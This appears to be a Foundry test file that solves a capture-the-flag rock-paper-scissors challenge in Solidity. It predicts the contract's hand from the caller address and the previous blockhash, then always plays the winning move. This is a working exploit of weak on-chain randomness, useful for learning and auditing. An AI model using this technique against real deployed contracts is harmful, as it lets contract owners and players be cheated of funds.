// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Test, console2} from "forge-std/Test.sol";
import {Challenge, RockPaperScissors} from "../../src/day02/rock-paper-scissor.sol";

contract SolveTest is Test {
    Challenge challenge;

    function setUp() public {
        challenge = new Challenge(address(this));
    }

    function testExploit() public {
        RockPaperScissors.Hand res =
            RockPaperScissors.Hand(uint256(keccak256(abi.encodePacked(address(this), blockhash(block.number - 1)))) % 3);
        if (res == RockPaperScissors.Hand.Rock) {
            challenge.rps().tryToBeatMe(RockPaperScissors.Hand.Paper);
        } else if (res == RockPaperScissors.Hand.Paper) {
            challenge.rps().tryToBeatMe(RockPaperScissors.Hand.Scissors);
        } else if (res == RockPaperScissors.Hand.Scissors) {
            challenge.rps().tryToBeatMe(RockPaperScissors.Hand.Rock);
        }

        assertTrue(challenge.isSolved());
    }
}
